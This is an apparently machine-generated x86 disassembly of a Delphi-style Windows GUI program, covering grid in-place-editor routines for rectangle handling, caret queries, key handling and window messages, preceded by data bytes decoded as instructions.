add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x57b3ffbc ] al
inc ebx
add [ eax + 0x440043aa ] cl
stosb [ edi ]
inc ebx
add [ esp + ebp * 4 ] cl
inc ebx
add [ eax + 0x680043aa ] bh
stosb [ edi ]
inc ebx
add [ eax + edi * 2 - 0x548fffba ] dh
inc ebx
add [ ecx + ebp * 4 + 0x46 ] cl
add al al
js r-xdata
outsd
outsb
mov eax eax
or [ ebp + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
mov es [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi - 0x713dffba ] cl
inc esi
add [ eax + 0x2 ] cl
add [ eax ] al
inc esp
arpl [ esi ] ax
and [ ebp + 0x35980041 ] ah
inc eax
add [ esi + ebx * 4 + 0x41 ] dh
add [ eax - 0x63ffbfcb ] ah
scasd [ edi ]
inc ebx
add ah bl
xor al [ eax ]
clc
xor al [ eax ]
aam 0x4b
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
outsd
push esi
popad
arpl [ ebp + 0x45 ] sp
imul esi [ fs : eax + edx * 4 - 0x2c ] 0x700468e
or al 0x54
dec ecx
outsb
jo r-xdata
outsd
dec esp
imul ebp [ esi + 0x65 ] 0x486f670a
outsd
jb r-xdata
or eax 0x61526f67
popad
arpl [ ebp + 0x45 ] sp
imul esi [ fs : eax + eax * 4 - 0x73 ] 0x65000046
inc esi
add [ eax + eax ] cl
add eax 0x64697247
jae r-xdata
add al [ eax ]
add [ eax ] al
clc
pop [ esi ]
or ah [ edi + 0x64 ]
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] esp
inc esi
outsd
arpl [ ebp + 0x73 ] si
pop es
insb
arpl [ gs : edx + edx + 0x67 ] si
outsd
inc ecx
insb
ja r-xdata
jns r-xdata
outsb
push ebx
insb
arpl [ gs : ebx + edx + 0x67 ] si
outsd
inc esp
jb r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x526f670d
popad
popad
ja r-xdata
add al bh
mov es [ esi ]
add ecx [ ebx ]
push esp
inc edi
jb r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
mov eax 0x8004690
inc esp
jb r-xdata
jae r-xdata
push cs
add [ esi ] al
push ebx
push 0x6445776f
imul esi [ edi + ebp * 2 + 0x72 ] 0x546f670f
push edx
outsd
ja r-xdata
push es
outsd
outsd
arpl [ ebp + 0x73 ] si
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or esp [ edi + 0x6f ]
je r-xdata
dec edi
jo r-xdata
inc eax
ja r-xdata
insb
popad
outsb
ja r-xdata
outsd
ja r-xdata
inc esi
imul edi [ eax + 0x65 ] 0x72470564
imul esp [ ebx + esi * 2 + 0x34 ] 0x6004690
pop es
push esp
inc edi
jb r-xdata
arpl [ ebx + 0x69 ] bp
outsb
add eax 0x64697247
push 0x54626d75
jb r-xdata
inc ebp
imul edi [ edx + 0x69 ] 0x670b676e
outsd
push edx
outsd
ja r-xdata
or esp [ fs : edi + 0x6f ]
inc ebx
outsd
or esp [ edi + 0x6f ]
imul ebp [ edi + 0x6e ] 0x1
add [ esi ] cl
add [ eax ] al
add ah dh
mov es [ esi ]
packuswb mm5 [ edi + 0x46 ]
imul edi [ eax + 0x65 ] 0x72655664
je r-xdata
add eax 0x74617453
push cs
insb
insb
inc ebp
jbe r-xdata
popad
je r-xdata
add [ ecx ] ecx
dec ecx
outsb
je r-xdata
imul esi [ fs : edi + ebp * 2 + 0x72 ] 0x546f670f
pop [ esi ]
push es
or al 0x54
inc edi
jb r-xdata
jae r-xdata
imul ebp [ ecx + 0x6e ] 0x67
add eax 0x64697247
outsd
jbe r-xdata
outsd
imul ebp [ esi + 0x65 ] 0x466f670f
imul edi [ eax + 0x65 ] 0x726f4864
jpe r-xdata
add al ch
mov dl 0x46
add [ eax + ebx * 4 - 0x46e3ffbc ] bl
inc esp
jb r-xdata
inc esi
add [ ebp - 0x6e83ffc0 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jb r-xdata
jb r-xdata
push ebx
insb
dec edi
jo r-xdata
inc esi
add [ eax + r-xdata ] dl
add eax [ edx ]
xor eax [ cs : ecx ]
outsb
or esp [ bx + 0x6f ]
inc ebx
outsd
insb
dec ebp
outsd
jbe r-xdata
insb
push ebx
imul edi [ edx + 0x69 ] 0x670b676e
outsd
push edx
outsd
ja r-xdata
jb r-xdata
imul ebp [ esi + 0x65 ] 0x566f670a
inc esi
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x4fffb94f ] bl
xchg ebx eax
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ ecx + ebp * 8 ] al
inc esi
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
stosb [ edi ]
inc esp
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ecx * 4 - 0x3e3bffbc ] al
inc esi
add [ eax ] bl
int3
add al bh
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
push cs
push esp
inc esp
jb r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax + 0x8004690 ] bh
arpl [ gs : ebx + eax * 2 + 0x65 ] si
insb
insb
inc ebp
jbe r-xdata
add eax edi
pop [ esi ]
lea eax [ eax ]
push eax
nop
inc esi
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] dl
insb
je r-xdata
add al 0x52
inc ebx
outsb
push ebx
insb
arpl [ gs : edi + eax + 0x42 ] si
outsd
outsd
or [ ebx + 0x61 ] eax
je r-xdata
outsb
outsb
je r-xdata
add [ eax + ecx ] al
imul ebp [ edi + 0x6e ] 0x8ef40373
add [ eax ] al
add [ eax ] al
push esp
popad
bound esi [ ebx + 0xb ]
outsd
outsb
or [ bx + 0x6f ] esp
inc ebp
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x6f670667
add [ eax - 0x3ffbfcb ] ah
je r-xdata
add [ ecx + eax * 2 ] al
inc ebx
outsd
insb
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc ecx
xor al [ eax ]
call 0xffffffff9c46d82f
inc esp
add ah bl
xor al [ eax ]
clc
push esp
inc edi
jb r-xdata
push cs
push 0x32dc0044
inc eax
mov al [ 0xfffffffffc004035 ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
add [ ecx + eax * 2 ] al
inc ebx
outsd
insb
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc ecx
je r-xdata
add [ eax ] al
xchg edx eax
inc esi
add [ ebx + edx * 4 + 0x2940046 ] cl
add [ eax ] al
jb r-xdata
jb r-xdata
jb r-xdata
cwde
inc esp
add [ ecx + edi * 4 ] bl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] dh
nop
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add al 0x41
push edx
outsd
ja r-xdata
add al 0x41
push edx
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
hlt
jb r-xdata
sub_4692c7
push [ eax ]
add eax [ edi ]
pop esp
add eax [ edi ]
add [ ebx ] 0x47
add [ ebx + eax + 0x3b40047 ] dl
inc edi
add [ edi + eax + 0x47 ] ch
add ah dh
inc [ esi ]
sbb al 0x3
inc edi
add [ eax + eax ] bl
inc edi
add [ eax ] dl
inc edi
add [ edx + eax + 0x47 ] dh
add [ eax - 0x33ffb900 ] al
add [ edi ] al
hlt
sub_46a36c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov eax [ esp ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0xc ]
jge r-xdata
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
sub_46a40c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_46a3f0
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_46a3f0
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
xor eax eax
jmp r-xdata
test al al
je r-xdata
sub_46a458
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax edi
call sub_46a40c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46a40c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
lea edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_46a40c
pop ecx
test al al
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
sub_46a4d0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax ebx
xor ecx ecx
mov edx 0x40
call sub_402d44
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call UnionRect
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
call sub_412edc
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_412edc
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_412edc
lea edx [ ebp - 0x40 ]
mov eax ebx
pop ecx
call sub_46a458
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi eax
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_412edc
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
call sub_412edc
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_412edc
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x10 ]
pop ecx
call sub_46a458
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x8 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412edc
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_412edc
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
call sub_412edc
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x20 ]
pop ecx
call sub_46a458
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x1c ] eax
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_412edc
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_412edc
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
call sub_412edc
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x30 ]
pop ecx
call sub_46a458
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x34 ] eax
sub_46a660
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46a73f
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a746
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4040b8
retn
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor esi esi
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
call sub_46a354
cmp esi [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp esi 0x7fffffe
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0xc ]
call sub_46a354
jmp r-xdata
add edi esi
mov esi edi
test esi esi
jge r-xdata
test esi esi
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x10 ]
call sub_46a354
mov edx esi
shl edx 0x2
mov eax ebx
call sub_402734
cmp [ ebx ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
inc eax
cmp esi eax
jle r-xdata
dec esi
mov eax [ ebx ]
mov [ eax ] esi
mov edx [ ebx ]
mov ecx [ ebp + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
cmp esi eax
jg r-xdata
sub_46a750
push ebx
push esi
xor esi esi
cmp [ eax ] 0x0
je r-xdata
push ecx
mov ecx edx
sub ecx esi
mov edx esi
call sub_46a660
pop esi
pop ebx
retn
mov ebx [ eax ]
mov esi [ ebx ]
sub_46a76c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov edi [ eax + edx * 4 ]
cmp esi edx
jle r-xdata
cmp esi edx
jge r-xdata
mov eax esi
sub eax edx
mov ecx eax
shl ecx 0x2
mov eax [ ebx ]
lea eax [ eax + edx * 4 + 0x4 ]
mov ebp [ ebx ]
lea edx [ ebp + edx * 4 ]
call sub_4028f0
jmp r-xdata
mov eax [ ebx ]
mov [ eax + esi * 4 ] edi
mov eax [ ebx ]
lea eax [ eax + esi * 4 ]
mov ecx [ ebx ]
lea ecx [ ecx + esi * 4 + 0x4 ]
sub edx esi
shl edx 0x2
xchg edx ecx
call sub_4028f0
sub_46a7c4
push ebx
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
test edi edi
sete dl
test edi edi
je r-xdata
mov eax edx
pop edi
pop esi
pop ebx
retn
mov esi [ eax ]
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx [ edi + ecx * 4 ]
jne r-xdata
sub_46a800
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466e08
xor edx edx
mov eax esi
call sub_448ef4
xor edx edx
mov eax esi
call sub_448ec4
xor edx edx
mov eax esi
call sub_448fb8
xor edx edx
mov eax esi
call sub_43a880
mov [ esi + 0x1f8 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_46a87c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x240 ]
test [ eax + 0x249 ] 0x8
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x2
sub_46a8a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4672fc
sub_46a8c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46a8e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4672c8
sub_46a918
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
mov eax [ eax + 0x240 ]
mov si 0xffe2
call sub_403540
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_46a960
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x9 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffbc
call sub_403540
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
pop esi
pop ebp
retn
sub_46a994
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ eax + 0x1d8 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
sub_46aa08
push ebp
mov ebp esp
push ebx
mov ebx eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0xb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
push eax
call SendMessageA
pop ebx
pop ebp
retn
sub_46aa2c
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
call GetCaretPos
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
call sub_406c04
push eax
push 0x0
push 0xd7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
push eax
call SendMessageA
pop ecx
pop ecx
pop ebp
retn
sub_46aa68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_46aa08
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4670e0
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
call sub_46aa2c
pop ecx
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4670e0
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
sub_46aac0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_46aa08
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_46aa2c
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4670e0
cmp ebx eax
je r-xdata
sub_46ab0c
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x26
jg r-xdata
cmp eax 0x2d
jg r-xdata
je r-xdata
sub eax 0x2e
je r-xdata
je r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
cmp eax 0x23
jg r-xdata
push ebp
call sub_46a9f8
pop ecx
test al al
je r-xdata
sub eax 0x43
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
sub eax 0x27
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x24
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403540
test al al
jne r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
push ebp
call sub_46a994
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x71
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
push ebp
call sub_46a9dc
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebp
call sub_46a994
pop ecx
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_466e5c
push ebp
call sub_46a9dc
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
push ebp
call sub_46a9dc
pop ecx
test al al
je r-xdata
sub eax 0x9
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
call sub_46aeb8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403540
test al al
jne r-xdata
push ebp
call sub_46a9f8
pop ecx
test al al
jne r-xdata
jmp r-xdata
push ebp
call sub_46a9f8
pop ecx
test al al
jne r-xdata
push ebp
call sub_46a9dc
pop ecx
test al al
je r-xdata
jmp r-xdata
push ebp
call sub_46a9f8
pop ecx
test al al
jne r-xdata
test [ ebp - 0x9 ] 0x2
jne r-xdata
sub eax 0x12
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
push ebp
call sub_46aa68
pop ecx
test al al
je r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
push ebp
call sub_46aac0
pop ecx
test al al
je r-xdata
push ebp
call sub_46a9f8
pop ecx
test al al
jne r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
push ebp
call sub_46aa68
pop ecx
test al al
je r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
add eax 0xfffffffa
sub eax 0x2
jb r-xdata
push ebp
call sub_46a960
pop ecx
jmp r-xdata
push ebp
call sub_46aac0
pop ecx
test al al
je r-xdata
jmp r-xdata
sub_46ad39
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx ebx
mov eax [ edi + 0x240 ]
mov si 0xffba
call sub_403540
mov al [ ebx ]
add al 0xe0
sub al 0xe0
jae r-xdata
xor eax eax
mov al [ ebx ]
cmp eax 0x16
jg r-xdata
mov dl [ ebx ]
mov eax [ edi + 0x240 ]
mov si 0xffb2
call sub_403540
test al al
jne r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
mov eax [ edi + 0x240 ]
mov si 0xffb0
call sub_403540
test al al
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x8
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xe0
jb r-xdata
dec eax
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_466f8c
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax edi
call sub_448d84
push eax
call SendMessageA
cmp [ esp ] 0x0
jne r-xdata
jmp r-xdata
mov eax edi
call sub_43ab54
mov eax edi
call sub_4670e0
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax edi
call sub_46aeb8
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
sub_46ae40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax ebx
call sub_45a2f0
test eax eax
je r-xdata
sub eax 0x1fa
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_45a2f0
mov edx [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
call GetMessageTime
mov edi eax
sub edi [ ebx + 0x244 ]
call GetDoubleClickTime
cmp edi eax
jae r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x244 ] eax
mov [ esi ] 0x203
mov edx esi
mov eax ebx
call sub_446798
sub_46aed8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
mov eax ebx
call sub_448d84
push eax
call ValidateRect
push 0xffffffff
